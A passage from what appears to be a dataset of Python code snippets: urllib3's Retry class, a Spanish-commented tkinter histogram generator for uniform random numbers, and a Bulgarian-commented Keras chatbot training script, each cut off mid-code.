sep='')\n        arr = arr.reshape(self.height, self.width, 4)\n        retu",
    "from __future__ import absolute_import\n\nimport email\nimport logging\nimport re\nimport time\nimport warnings\nfrom collections import namedtuple\nfrom itertools import takewhile\n\nfrom ..exceptions import (\n    ConnectTimeoutError,\n    InvalidHeader,\n    MaxRetryError,\n    ProtocolError,\n    ProxyError,\n    ReadTimeoutError,\n    ResponseError,\n)\nfrom ..packages import six\n\nlog = logging.getLogger(__name__)\n\n\n# Data structure for representing the metadata of requests that result in a retry.\nRequestHistory = namedtuple(\n    \"RequestHistory\", [\"method\", \"url\", \"error\", \"status\", \"redirect_location\"]\n)\n\n\n# TODO: In v2 we can remove this sentinel and metaclass with deprecated options.\n_Default = object()\n\n\nclass _RetryMeta(type):\n    @property\n    def DEFAULT_METHOD_WHITELIST(cls):\n        warnings.warn(\n            \"Using 'Retry.DEFAULT_METHOD_WHITELIST' is deprecated and \"\n            \"will be removed in v2.0. Use 'Retry.DEFAULT_ALLOWED_METHODS' instead\",\n            DeprecationWarning,\n        )\n        return cls.DEFAULT_ALLOWED_METHODS\n\n    @DEFAULT_METHOD_WHITELIST.setter\n    def DEFAULT_METHOD_WHITELIST(cls, value):\n        warnings.warn(\n            \"Using 'Retry.DEFAULT_METHOD_WHITELIST' is deprecated and \"\n            \"will be removed in v2.0. Use 'Retry.DEFAULT_ALLOWED_METHODS' instead\",\n            DeprecationWarning,\n        )\n        cls.DEFAULT_ALLOWED_METHODS = value\n\n    @property\n    def DEFAULT_REDIRECT_HEADERS_BLACKLIST(cls):\n        warnings.warn(\n            \"Using 'Retry.DEFAULT_REDIRECT_HEADERS_BLACKLIST' is deprecated and \"\n            \"will be removed in v2.0. Use 'Retry.DEFAULT_REMOVE_HEADERS_ON_REDIRECT' instead\",\n            DeprecationWarning,\n        )\n        return cls.DEFAULT_REMOVE_HEADERS_ON_REDIRECT\n\n    @DEFAULT_REDIRECT_HEADERS_BLACKLIST.setter\n    def DEFAULT_REDIRECT_HEADERS_BLACKLIST(cls, value):\n        warnings.warn(\n            \"Using 'Retry.DEFAULT_REDIRECT_HEADERS_BLACKLIST' is deprecated and \"\n            \"will be removed in v2.0. Use 'Retry.DEFAULT_REMOVE_HEADERS_ON_REDIRECT' instead\",\n            DeprecationWarning,\n        )\n        cls.DEFAULT_REMOVE_HEADERS_ON_REDIRECT = value\n\n    @property\n    def BACKOFF_MAX(cls):\n        warnings.warn(\n            \"Using 'Retry.BACKOFF_MAX' is deprecated and \"\n            \"will be removed in v2.0. Use 'Retry.DEFAULT_BACKOFF_MAX' instead\",\n            DeprecationWarning,\n        )\n        return cls.DEFAULT_BACKOFF_MAX\n\n    @BACKOFF_MAX.setter\n    def BACKOFF_MAX(cls, value):\n        warnings.warn(\n            \"Using 'Retry.BACKOFF_MAX' is deprecated and \"\n            \"will be removed in v2.0. Use 'Retry.DEFAULT_BACKOFF_MAX' instead\",\n            DeprecationWarning,\n        )\n        cls.DEFAULT_BACKOFF_MAX = value\n\n\n@six.add_metaclass(_RetryMeta)\nclass Retry(object):\n    \"\"\"Retry configuration.\n\n    Each retry attempt will create a new Retry object with updated values, so\n    they can be safely reused.\n\n    Retries can be defined as a default for a pool::\n\n        retries = Retry(connect=5, read=2, redirect=5)\n        http = PoolManager(retries=retries)\n        response = http.request('GET', 'http://example.com/')\n\n    Or per-request (which overrides the default for the pool)::\n\n        response = http.request('GET', 'http://example.com/', retries=Retry(10))\n\n    Retries can be disabled by passing ``False``::\n\n        response = http.request('GET', 'http://example.com/', retries=False)\n\n    Errors will be wrapped in :class:`~urllib3.exceptions.MaxRetryError` unless\n    retries are disabled, in which case the causing exception will be raised.\n\n    :param int total:\n        Total number of retries to allow. Takes precedence over other counts.\n\n        Set to ``None`` to remove this constraint and fall back on other\n        counts.\n\n        Set to ``0`` to fail on the first retry.\n\n        Set to ``False`` to disable and imply ``raise_on_redirect=False``.\n\n    :param int connect:\n        How many connection-related errors to retry on.\n\n        These are errors raised before the request is sent to the remote server,\n        which we assume has not triggered the server to process the request.\n\n        Set to ``0`` to fail on the first retry of this type.\n\n    :param int read:\n        How many times to retry on read errors.\n\n        These errors are raised after the request was sent to the server, so the\n        request may have side-effects.\n\n        Set to ``0`` to fail on the first retry of this type.\n\n    :param int redirect:\n        How many redirects to perform. Limit this to avoid infinite redirect\n        loops.\n\n        A redirect is a HTTP response with a status code 301, 302, 303, 307 or\n        308.\n\n        Set to ``0`` to fail on the first retry of this type.\n\n        Set to ``False`` to disable and imply ``raise_on_redirect=False``.\n\n    :param int status:\n        How many times to retry on bad status codes.\n\n        These are retries made on responses, where status code matches\n        ``status_forcelist``.\n\n        Se",
    "# Importaciones\nimport random #Numeros randoms incorporados en python\nimport math #Para constantes como pi\nimport pyclip #Integracion del clipboard para copiar valores de las series\nimport tkinter # Parte del gui\nimport customtkinter #Parte del gui\nimport matplotlib.pyplot as plt\n\n\ndef graficar(frec,lista_intervalos):\n    plt.close()\n    plt.ioff()\n    plt.title(\"Histograma de Frecuencias\")\n    rango = lista_intervalos[3][2] - lista_intervalos[3][1]\n    plt.bar(lista_intervalos[3],frec,width=rango,color=\"lightgrey\", ec=\"orange\")\n    plt.xticks(lista_intervalos[2])    \n    plt.xlabel(\"Intervalos\")\n    plt.ylabel(\"Frecuencias\")\n    plt.show()\n    #plt.savefig('plot.png') Guardar imagen x si acaso\n\ndef agregar_numeros(frame, lista, indice):\n    #Tenemos un indice, un tiempo de espera y conjunto de datos a cargar\n    #Debido a la alta carga para el procesador de colocar tantos elementos a la vez para n > 10.000, se utiliza cargas x lote de a 10\n    for i in range(10):\n        if indice < len(lista):\n            #Se crea labels hasta cumplir el primer conjunto\n            elemento = lista[indice]\n            customtkinter.CTkLabel(frame, text=elemento).pack()\n            indice += 1\n        #Utilizamos \"after\", una funcion de tkinter que llama a una funcion con sus variables despues de un tiempo en milisegundos \"100\" \n    if indice < len(lista):\n        #Si aun el indice es menor a la cantidad de datos, sigue activando la funcion hasta que termine, gracias a after TKINTER despues de un tiempo\n        frame.after(100, agregar_numeros, frame, lista, indice)\n\ndef segmentacion(lista):\n    #Devuelvo una lista conformada con otras listas asi -> [Num Intervalo,Valor Inf,Valor Sup,Marca Clase]\n    n = int(texto_muestra.get())\n    intervalos = int(texto_intervalos.get())\n    n_max = max(lista)\n    n_min = min(lista)\n    print(\"Numero max:\",n_max)\n    print(\"Numero min:\",n_min)\n    rango = round((n_max - n_min)/intervalos,2) + 0.01\n    print(\"Rango:\",rango)\n    lista_intervalos = [[],[],[],[]]\n    for i in range(0, intervalos):\n        val_sup = round(n_min + rango,2)\n        lista_intervalos[0].append(i + 1)\n        lista_intervalos[1].append(round(n_min,2))\n        lista_intervalos[2].append(val_sup)\n        lista_intervalos[3].append(round((val_sup+n_min)/2,2))\n        n_min += round(rango,2)\n    # print(\"Lista de Intervalos:\")\n    # print(lista_intervalos)\n    return lista_intervalos\n\ndef obtener_frecuencias(lista):\n    for widget in frame_frecuencia.winfo_children():\n        widget.destroy()\n    lista_intervalos = segmentacion(lista)\n    q_interv = int(texto_intervalos.get()) \n    print(\"Cantidad de intervalos:\",q_interv)\n    n = int(texto_muestra.get())\n    #Creo una lista vacia de valores de frecuencia, 1 x cada intervalo\n    frec = [0] * q_interv\n    frec_acum = [0] * q_interv #Lista de frec Acumulada\n    acum = 0 #acumulador\n    #Reviso numero x numero\n    for i in range(0,n):\n        #Reviso Intervalo x intervalo\n        for o in range(0,q_interv):\n            #Si el valor es mayor al intervalo superior revisando, paso al otro intervalo, sino sumo uno en frecuencia\n            if lista[i] < lista_intervalos[2][o]:\n                frec[o] += 1\n                break\n    for i in range(0,len(frec)):\n        acum += frec[i]\n        frec_acum[i]= acum\n    #Coloco en el frame de frecuencias, los valores obtenidos\n    for i in range(0,q_interv):\n        texto_intervalo = \"[ \" + str(lista_intervalos[1][i]) + \",\" + str(lista_intervalos[2][i]) + \" )\"\n        customtkinter.CTkButton(frame_frecuencia, text=texto_intervalo,fg_color=\"#6f632d\").grid(row=i,column=0,pady=5,padx=1)\n        customtkinter.CTkButton(frame_frecuencia, text=frec[i],fg_color=\"#a68cd9\").grid(row=i,column=1,pady=5,padx=1)\n        customtkinter.CTkButton(frame_frecuencia, text=lista_intervalos[3][i],fg_color=\"#a68cd9\").grid(row=i,column=2,pady=5,padx=1)\n        customtkinter.CTkButton(frame_frecuencia, text=frec_acum[i],fg_color=\"#5f4758\").grid(row=i,column=3,pady=5,padx=1)\n    return frec,lista_intervalos\n      \ndef generar_uniforme():\n    #Destruye la lista generada anteriormente\n    for widget in frame_lista.winfo_children():\n       widget.destroy()\n    #Obtengo los valores de cada celda de texto\n    random.seed(int(texto_semilla.get()))\n    n = int(texto_muestra.get())\n    a = int(texto_a.get())\n    b = int(texto_b.get())\n    #Genero los numeros\n    lista = []\n    for i in range(0,n):\n        rnd = random.uniform(0,1)\n        x = rnd*(b - a) + a\n        x = round(x,2)\n        lista.append(x)\n    agregar_numeros(frame_lista, lista,0)\n    print(\"Lista generada: \")\n    print(lista)\n    #Copia al clipboard la lista generada \n    lista_a_copiar = \"\\n\".join(map(str,lista))\n    pyclip.copy(lista_a_copiar)\n    frec , lista_intervalos = obtener_frecuencias(lista)\n    #Como necesito una lista con valores de todos los intervalos, solo agrego el faltante de los inferiores o superiores al contrario y lo uso\n    lista_intervalos[2].insert(0,lista_intervalos[1][0])\n",
    "print(\"\\n\u0410\u0410\u0410!?\")\nprint(\"\u041a\u043e\u0439 \u043c\u0438 \u0441\u0432\u0435\u0442\u043d\u0430 \u043b\u0430\u043c\u043f\u0438\u0442\u0435!?\")\nprint(\"\u0414\u0430\u0439 \u043c\u0438 \u043c\u0438\u043d\u0443\u0442\u043a\u0430 \u0434\u0430 \u0441\u0435 \u0441\u044a\u0432\u0437\u0435\u043c\u0430...\\n\")\n\nimport os\nos.environ['TF_ENABLE_ONEDNN_OPTS'] = '0' # \u043f\u0440\u0435\u043c\u0430\u0445\u0432\u0430\u043d\u0435 \u043d\u0430 \u0438\u0437\u043b\u0438\u0448\u043d\u0438 \u043f\u0440\u0435\u0434\u0443\u043f\u0440\u0435\u0436\u0434\u0435\u043d\u0438\u044f \u043e\u0442 \u043a\u043e\u043d\u0437\u043e\u043b\u0430\u0442\u0430\nos.environ['TF_CPP_MIN_LOG_LEVEL'] = '2' # \u043f\u0440\u0435\u043c\u0430\u0445\u0432\u0430\u043d\u0435 \u043d\u0430 \u0438\u0437\u043b\u0438\u0448\u043d\u0438 \u043f\u0440\u0435\u0434\u0443\u043f\u0440\u0435\u0436\u0434\u0435\u043d\u0438\u044f \u043e\u0442 \u043a\u043e\u043d\u0437\u043e\u043b\u0430\u0442\u0430\nimport warnings\nwarnings.filterwarnings(\"ignore\") # \u043f\u0440\u0435\u043c\u0430\u0445\u0432\u0430\u043d\u0435 \u043d\u0430 \u0438\u0437\u043b\u0438\u0448\u043d\u0438 \u043f\u0440\u0435\u0434\u0443\u043f\u0440\u0435\u0436\u0434\u0435\u043d\u0438\u044f \u043e\u0442 \u043a\u043e\u043d\u0437\u043e\u043b\u0430\u0442\u0430\n\nfrom keras.models import load_model\nfrom keras.layers import Dense\nfrom keras.models import Sequential\nimport pickle\nimport json\nimport numpy as np\nimport tensorflow as tf\nimport random\nimport nltk\nfrom nltk.stem.lancaster import LancasterStemmer\n\nstemmer = LancasterStemmer() # \u0437\u0430 \u043a\u043e\u0440\u0435\u043d\u0443\u0432\u0430\u043d\u0435 \u043d\u0430 \u0434\u0443\u043c\u0438\u0442\u0435\n\ntry:\n    with open('intents.json', encoding='utf-8') as json_data: # utf-8 \u0437\u0430 \u043f\u043e\u043b\u0437\u0432\u0430\u043d\u0435 \u043d\u0430 \u043a\u0438\u0440\u0438\u043b\u0438\u0446\u0430\n        intents = json.load(json_data) # \u0437\u0430\u0440\u0435\u0436\u0434\u0430\u043d\u0435 \u0438 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u043d\u0430 \u043d\u0430\u043c\u0435\u0440\u0435\u043d\u0438\u044f\u0442\u0430 \u043e\u0442 \u0444\u0430\u0439\u043b intents.json\nexcept FileNotFoundError:\n    print(\"\u0413\u0440\u0435\u0448\u043a\u0430: \u0444\u0430\u0439\u043b\u044a\u0442 intents.json \u043d\u0435 \u0435 \u043d\u0430\u043c\u0435\u0440\u0435\u043d. \u041c\u043e\u043b\u044f, \u0443\u0432\u0435\u0440\u0435\u0442\u0435 \u0441\u0435, \u0447\u0435 \u0444\u0430\u0439\u043b\u044a\u0442 \u0441\u044a\u0449\u0435\u0441\u0442\u0432\u0443\u0432\u0430.\")\n    exit(1)\n\nwords = [] # \u043e\u0442\u0434\u0435\u043b\u043d\u0438 \u0434\u0443\u043c\u0438\ntags = [] # \u0442\u0430\u0433\u043e\u0432\u0435\nwordToTag = [] # \u0434\u0443\u043c\u0430 - \u0442\u0430\u0433\nignoreWords = ['?', '!', '.']\n\n'''\n\u0422\u043e\u043a\u0435\u043d\u0438\u0437\u0438\u0440\u0430\u043d\u0435\u0442\u043e \u0432\u043a\u043b\u044e\u0447\u0432\u0430 \u0440\u0430\u0437\u0434\u0435\u043b\u044f\u043d\u0435 \u043d\u0430 \u0438\u0437\u0440\u0435\u0447\u0435\u043d\u0438\u044f\u0442\u0430 \u043d\u0430 \u043e\u0442\u0434\u0435\u043b\u043d\u0438 \u0434\u0443\u043c\u0438 \u0437\u0430 \u043f\u043e-\u043d\u0430\u0442\u0430\u0442\u044a\u0448\u0435\u043d \u0430\u043d\u0430\u043b\u0438\u0437, \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u0438 \u0438\u0437\u0432\u043b\u0438\u0447\u0430\u043d\u0435 \u043d\u0430 \u0444\u0443\u043d\u043a\u0446\u0438\u0438. \n\u0422\u043e\u0432\u0430 \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0432\u0430 \u043d\u0430 \u043a\u043e\u043c\u043f\u044e\u0442\u0440\u0438\u0442\u0435 \u0434\u0430 \u0440\u0430\u0437\u0431\u0438\u0440\u0430\u0442 \u0438 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0432\u0430\u0442 \u0447\u043e\u0432\u0435\u0448\u043a\u0438\u044f \u0435\u0437\u0438\u043a.\n'''\n\nfor intent in intents['intents']:\n    for pattern in intent['patterns']:\n        word = nltk.word_tokenize(pattern) # \u0440\u0430\u0437\u0434\u0435\u043b\u044f\u043d\u0435 \u043d\u0430 \u0432\u0441\u044f\u043a\u0430 \u0434\u0443\u043c\u0430 \u0432 \u0438\u0437\u0440\u0435\u0447\u0435\u043d\u0438\u0435\u0442\u043e\n        words.extend(word)\n        wordToTag.append((word, intent['tag']))\n        if intent['tag'] not in tags:\n            tags.append(intent['tag'])\n\n'''\n\u0420\u0430\u0437\u0434\u0435\u043b\u044f\u043d\u0435\u0442\u043e \u043d\u0430 \u043a\u043e\u0440\u0435\u043d\u0438 \u0441\u0435 \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430 \u0437\u0430 \u043f\u0440\u0435\u0434\u0432\u0430\u0440\u0438\u0442\u0435\u043b\u043d\u0430 \u043e\u0431\u0440\u0430\u0431\u043e\u0442\u043a\u0430 \u043d\u0430 \u0434\u0443\u043c\u0438\u0442\u0435 \u0432 \u0438\u0437\u0440\u0435\u0447\u0435\u043d\u0438\u044f\u0442\u0430.\n\u0422\u0430\u0437\u0438 \u0441\u0442\u044a\u043f\u043a\u0430 \u0433\u0430\u0440\u0430\u043d\u0442\u0438\u0440\u0430, \u0447\u0435 \u043f\u043e\u0434\u043e\u0431\u043d\u0438 \u0434\u0443\u043c\u0438 \u0441\u0435 \u0442\u0440\u0435\u0442\u0438\u0440\u0430\u0442 \u0438\u0434\u0435\u043d\u0442\u0438\u0447\u043d\u043e \u043f\u043e \u0432\u0440\u0435\u043c\u0435 \u043d\u0430 \u043e\u0431\u0443\u0447\u0435\u043d\u0438\u0435\u0442\u043e, \n\u043a\u0430\u0442\u043e \u043f\u043e \u0442\u043e\u0437\u0438 \u043d\u0430\u0447\u0438\u043d \u0441\u0435 \u043f\u043e\u0434\u043e\u0431\u0440\u044f\u0432\u0430 \u0441\u043f\u043e\u0441\u043e\u0431\u043d\u043e\u0441\u0442\u0442\u0430 \u043d\u0430 \u043c\u043e\u0434\u0435\u043b\u0430 \u0434\u0430 \u0440\u0430\u0437\u0431\u0438\u0440\u0430 \u0438 \u043e\u0442\u0433\u043e\u0432\u0430\u0440\u044f \u0435\u0444\u0435\u043a\u0442\u0438\u0432\u043d\u043e \u043d\u0430 \u043f\u043e\u0442\u0440\u0435\u0431\u0438\u0442\u0435\u043b\u0441\u043a\u0438\u0442\u0435 \u0437\u0430\u044f\u0432\u043a\u0438.\n'''\n\nwords = [stemmer.stem(word.lower()) for word in words if word not in ignoreWords] # \u043d\u0430\u043c\u0438\u0440\u0430\u043d\u0435 \u043d\u0430 \u043a\u043e\u0440\u0435\u043d\u0430 \u043d\u0430 \u0434\u0443\u043c\u0430\u0442\u0430, \u0441\u043c\u0430\u043b\u044f\u0432\u0430\u043d\u0435 \u043d\u0430 \u0433\u043b\u0430\u0432\u043d\u0438 \u0431\u0443\u043a\u0432\u0438 \u0438 \u043f\u0440\u0435\u043c\u0430\u0445\u0432\u0430\u043d\u0435 \u043d\u0430 \u043f\u0440\u0435\u043f\u0438\u043d\u0430\u0442\u0435\u043b\u043d\u0438 \u0437\u043d\u0430\u0446\u0438\nwords = sorted(list(set(words))) # \u043f\u0440\u0435\u043c\u0430\u0445\u0432\u0430\u043d\u0435 \u043d\u0430 \u0434\u0443\u0431\u043b\u0438\u043a\u0430\u0442\u0438\ntags = sorted(list(set(tags))) # \u043f\u0440\u0435\u043c\u0430\u0445\u0432\u0430\u043d\u0435 \u043d\u0430 \u0434\u0443\u0431\u043b\u0438\u043a\u0430\u0442\u0438\n\ntraining = []\noutput = []\noutputEmpty = [0] * len(tags)\nmaxBagLength = 0\ntrainingData = []\noutputEmpty = [0] * len(tags) # \u043b\u0438\u0441\u0442 \u043e\u0442 \u043d\u0443\u043b\u0438 \u0441\u044a\u0441 \u0441\u044a\u0449\u0438\u044f \u0440\u0430\u0437\u043c\u0435\u0440 \u043a\u0430\u0442\u043e \u0442\u043e\u0437\u0438 \u043d\u0430 \u0442\u0430\u0433\u043e\u0432\u0435\u0442\u0435 \n\n'''\n\u041f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u044f\u043d\u0435\u0442\u043e \u043d\u0430 \u0447\u0430\u043d\u0442\u0430\u0442\u0430 \u0441 \u0434\u0443\u043c\u0438 \u0441\u0435 \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430 \u0437\u0430 \u043f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u0443\u0432\u0430\u043d\u0435 \u043d\u0430 \u0438\u0437\u0440\u0435\u0447\u0435\u043d\u0438\u044f\u0442\u0430 \u0432 \u0447\u0438\u0441\u043b\u043e\u0432\u0438 \u0432\u0435\u043a\u0442\u043e\u0440\u0438 \u0437\u0430 \u043e\u0431\u0443\u0447\u0435\u043d\u0438\u0435 \u043d\u0430 \u0447\u0430\u0442\u0431\u043e\u0442\u0430. \n\u0412\u0441\u044f\u043a\u043e \u0438\u0437\u0440\u0435\u0447\u0435\u043d\u0438\u0435 \u0435 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u0435\u043d\u043e \u043a\u0430\u0442\u043e \u0432\u0435\u043a\u0442\u043e\u0440, \u043f\u043e\u043a\u0430\u0437\u0432\u0430\u0449 \u043d\u0430\u043b\u0438\u0447\u0438\u0435\u0442\u043e \u0438\u043b\u0438 \u043e\u0442\u0441\u044a\u0441\u0442\u0432\u0438\u0435\u0442\u043e \u043d\u0430 \u0434\u0443\u043c\u0438 \u043e\u0442 \u0440\u0435\u0447\u043d\u0438\u043a\u0430. \n\u0422\u043e\u0432\u0430 \u043f\u0440\u0435\u0434\u0441\u0442\u0430\u0432\u044f\u043d\u0435 \u043f\u043e\u0437\u0432\u043e\u043b\u044f\u0432\u0430 \u043d\u0430 \u043c\u043e\u0434\u0435\u043b\u0430 \u0434\u0430 \u043d\u0430\u0443\u0447\u0438 \u0430\u0441\u043e\u0446\u0438\u0430\u0446\u0438\u0438 \u043c\u0435\u0436\u0434\u0443 \u0432\u0445\u043e\u0434\u043d\u0438\u0442\u0435 \u0438\u0437\u0440\u0435\u0447\u0435\u043d\u0438\u044f \u0438 \u0441\u044a\u043e\u0442\u0432\u0435\u0442\u043d\u0438\u0442\u0435 \u0438\u043c \u043d\u0430\u043c\u0435\u0440\u0435\u043d\u0438\u044f \u0438\u043b\u0438 \u043e\u0442\u0433\u043e\u0432\u043e\u0440\u0438.\n'''\n\nfor doc in wordToTag:\n    bag = [] \n    patternWords = doc[0]\n    patternWords = [stemmer.stem(word.lower()) for word in patternWords] # \u043d\u0430\u043c\u0438\u0440\u0430\u043d\u0435 \u043d\u0430 \u043a\u043e\u0440\u0435\u043d\u0430 \u043d\u0430 \u0434\u0443\u043c\u0430\u0442\u0430, \u0441\u043c\u0430\u043b\u044f\u0432\u0430\u043d\u0435 \u043d\u0430 \u0433\u043b\u0430\u0432\u043d\u0438 \u0431\u0443\u043a\u0432\u0438 \u0438 \u043f\u0440\u0435\u043c\u0430\u0445\u0432\u0430\u043d\u0435 \u043d\u0430 \u043f\u0440\u0435\u043f\u0438\u043d\u0430\u0442\u0435\u043b\u043d\u0438 \u0437\u043d\u0430\u0446\u0438\n    for word in words:\n        bag.append(1) if word in patternWords else bag.append(0)        \n    maxBagLength = max(maxBagLength, len(bag))\n    outputRow = list(outputEmpty)\n    outputRow[tags.index(doc[1])] = 1\n    trainingData.append((bag, outputRow))\n\n'''\n\u041f\u043e\u0434\u0433\u043e\u0442\u0432\u044f\u043d\u0435 \u043d\u0430 \u0434\u0430\u043d\u043d\u0438\u0442\u0435 \u0437\u0430 \u043e\u0431\u0443\u0447\u0435\u043d\u0438\u0435, \u043a\u0430\u0442\u043e \u0441\u0435 \u043f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u0443\u0432\u0430\u0442 \u0432 \u043c\u0430\u0441\u0438\u0432\u0438 NumPy \n\u0438 \u0441\u0435 \u0441\u0442\u0440\u0443\u043a\u0442\u0443\u0440\u0438\u0440\u0430\u0442 \u0432\u044a\u0432 \u0444\u043e\u0440\u043c\u0430\u0442, \u043f\u043e\u0434\u0445\u043e\u0434\u044f\u0449 \u0437\u0430 \u043e\u0431\u0443\u0447\u0435\u043d\u0438\u0435 \u043d\u0430 \u043c\u043e\u0434\u0435\u043b\u0430 \u043d\u0430 \u043d\u0435\u0432\u0440\u043e\u043d\u043d\u0430\u0442\u0430 \u043c\u0440\u0435\u0436\u0430. \n\u0412\u0445\u043e\u0434\u043d\u0438\u0442\u0435 \u0445\u0430\u0440\u0430\u043a\u0442\u0435\u0440\u0438\u0441\u0442\u0438\u043a\u0438 (trainX) \u0438 \u0438\u0437\u0445\u043e\u0434\u043d\u0438\u0442\u0435 \u0435\u0442\u0438\u043a\u0435\u0442\u0438 (trainY) \u0441\u0435 \u0438\u0437\u0432\u043b\u0438\u0447\u0430\u0442 \u043e\u0442 \u0434\u0430\u043d\u043d\u0438\u0442\u0435 \u0437\u0430 \u043e\u0431\u0443\u0447\u0435\u043d\u0438\u0435, \n\u041e\u0441\u0432\u0435\u043d \u0442\u043e\u0432\u0430 \u0433\u0440\u0430\u0444\u0438\u043a\u0430\u0442\u0430 \u043d\u0430 TensorFlow \u0441\u0435 \u043d\u0443\u043b\u0438\u0440\u0430, \u0437\u0430 \u0434\u0430 \u0441\u0435 \u043e\u0441\u0438\u0433\u0443\u0440\u0438 \u0447\u0438\u0441\u0442 \u043b\u0438\u0441\u0442 \u043f\u0440\u0435\u0434\u0438 \u0438\u0437\u0433\u0440\u0430\u0436\u0434\u0430\u043d\u0435\u0442\u043e \u043d\u0430 \u043c\u043e\u0434\u0435\u043b\u0430 \u043d\u0430 \u043d\u0435\u0432\u0440\u043e\u043d\u043d\u0430\u0442\u0430 \u043c\u0440\u0435\u0436\u0430.\n'''\n\nbags = [data[0] for data in trainingData]\noutputRows = [data[1] for data in trainingData]\nbagsNumpy = np.array(bags)\noutput_rows_np = np.array(outputRows)\ntraining = np.column_stack((bagsNumpy, output_rows_np))\ntrainX = training[:, :-len(outputEmpty)]\ntrainY = training[:, -len(outputEmpty):]\ntf.compat.v1.reset_default_graph()\nprint(\"\u041e\u0444, \u043e\u0449\u0435 \u043b\u0438 \u0441\u0438 \u0442\u0443\u043a? \u041c\u043e\u043c\u0435\u043d\u0442...\")\n\n'''\n\u0421\u044a\u0437\u0434\u0430\u0432\u0430 \u0441\u0435 \u043f\u0440\u043e\u0441\u0442\u0430 \u043d\u0435\u0432\u0440\u043e\u043d\u043d\u0430 \u043c\u0440\u0435\u0436\u0430 \u0441 \u043f\u0440\u0435\u0434\u0432\u0430\u0440\u0438\u0442\u0435\u043b\u043d\u0430 \u0432\u0440\u044a\u0437\u043a\u0430 \u0441 \u043f\u043e\u043c\u043e\u0449\u0442\u0430 \u043d\u0430 \u201eKeras Sequential\u201c. \n\u041c\u043e\u0434\u0435\u043b\u044a\u0442 \u0441\u0435 \u0441\u044a\u0441\u0442\u043e\u0438 \u043e\u0442 \u0432\u0445\u043e\u0434\u0435\u043d \u0441\u043b\u043e\u0439 \u0441 8 \u043d\u0435\u0432\u0440\u043e\u043d\u0430 \u0432\u0441\u0435\u043a\u0438 \u0438 \u0438\u0437\u0445\u043e\u0434\u0435\u043d \u0441\u043b\u043e\u0439 \u0441\u044a\u0441 \u0441\u044a\u0449\u0438\u044f \u0431\u0440\u043e\u0439 \u043d\u0435\u0432\u0440\u043e\u043d\u0438 \u043a\u0430\u0442\u043e \u043a\u043b\u0430\u0441\u043e\u0432\u0435\u0442\u0435 \u0432 \u0434\u0430\u043d\u043d\u0438\u0442\u0435 \u0437\u0430 \u043e\u0431\u0443\u0447\u0435\u043d\u0438\u0435. \n\u0421\u043b\u0435\u0434 \u0442\u043e\u0432\u0430 \u043c\u043e\u0434\u0435\u043b\u044a\u0442 \u0441\u0435 \u043e\u0431\u0443\u0447\u0430\u0432\u0430 \u0432\u044a\u0440\u0445\u0443 \u043e\u0431\u0443\u0447\u0438\u0442\u0435\u043b\u043d\u0438\u044f \u043d\u0430\u0431\u043e\u0440 \u043e\u0442 \u0434\u0430\u043d\u043d\u0438 \u0437\u0430 666 \u0435\u043f\u043e\u0445\u0438, \n\u043a\u0430\u0442\u043e \u0441\u0435 \u0438\u0437\u043f\u043e\u043b\u0437\u0432\u0430 \u043e\u043f\u0442\u0438\u043c\u0438\u0437\u0430\u0442\u043e\u0440\u044a\u0442 \u043d\u0430 \u0410\u0434\u0430\u043c \u0438 \u0444\u0443\u043d\u043a\u0446\u0438\u044f\u0442\u0430 \u0437\u0430 \u043a\u0430\u0442\u0435\u0433\u043e\u0440\u0438\u0447\u043d\u0430 \u043a\u0440\u043e\u0441-\u0435\u043d\u0442\u0440\u043e\u043f\u0438\u0439\u043d\u0430 \u0437\u0430\u0433\u0443\u0431\u0430.\n'''\n\nmodel = Sequential() # Sequential \u043e\u043f\u0440\u043e\u0441\u0442\u044f\u0432\u0430 \u043f\u0440\u043e\u0446\u0435\u0441\u0430 \u043d\u0430 \u0438\u0437\u0433\u0440\u0430\u0436\u0434\u0430\u043d\u0435 \u043d\u0430 \u043c\u043e\u0434\u0435\u043b\u0438 \u043d\u0430 \u043d\u0435\u0432\u0440\u043e\u043d\u043d\u0438 \u043c\u0440\u0435\u0436\u0438, \u043a\u0430\u0442\u043e \u043f\u0440\u0435\u0434\u043e\u0441\u0442\u0430\u0432\u044f \u044f\u0441\u0435\u043d \u0438 \u0438\u043d\u0442\u0443\u0438\u0442\u0438\u0432\u0435\u043d \u0438\u043d\u0442\u0435\u0440\u0444\u0435\u0439\u0441 \u0437\u0430 \u0434\u043e\u0431\u0430\u0432\u044f\u043d\u0435 \u043d\u0430 \u0441\u043b\u043e\u0435\u0432\u0435 \u0438 \u0434\u0435\u0444\u0438\u043d\u0438\u0440\u0430\u043d\u0435 \u043d\u0430 \u043f\u043e\u0442\u043e\u043a\u0430 \u043e\u0442 \u0434\u0430\u043d\u043d\u0438 \u043f\u0440\u0435\u0437 \u043c\u0440\u0435\u0436\u0430\u0442\u0430.\nmodel.add(Dense(8, input_dim=maxBagLength, activation='relu')) # ReLU \u0435 \u043f\u0440\u043e\u0441\u0442\u0430, \u043d\u043e \u043c\u043e\u0449\u043d\u0430 \u0444\u0443\u043d\u043a\u0446\u0438\u044f \u0437\u0430 \u0430\u043a\u0442\u0438\u0432\u0438\u0440\u0430\u043d\u0435, \u043a\u043e\u044f\u0442\u043e \u043f\u043e\u043c\u0430\u0433\u0430 \u043d\u0430 \u043d\u0435\u0432\u0440\u043e\u043d\u043d\u0438\u0442\u0435 \u043c\u0440\u0435\u0436\u0438 \u0434\u0430 \u0443\u0447\u0430\u0442 \u0435\u0444\u0435\u043a\u0442\u0438\u0432\u043d\u043e \u0441\u043b\u043e\u0436\u043d\u0438 \u043c\u043e\u0434\u0435\u043b\u0438.\nmodel.add(Dense(8, activation='relu'))\nmodel.add(Dense(len(trainY[0]), activation='softmax')) # softmax \u0438\u0433\u0440\u0430\u0435 \u0440\u0435\u0448\u0430\u0432\u0430\u0449\u0430 \u0440\u043e\u043b\u044f \u0432 \u043f\u0440\u0435\u043e\u0431\u0440\u0430\u0437\u0443\u0432\u0430\u043d\u0435\u0442\u043e \u043d\u0430 \u043d\u0435\u043e\u0431\u0440\u0430\u0431\u043e\u0442\u0435\u043d\u0438\u0442\u0435 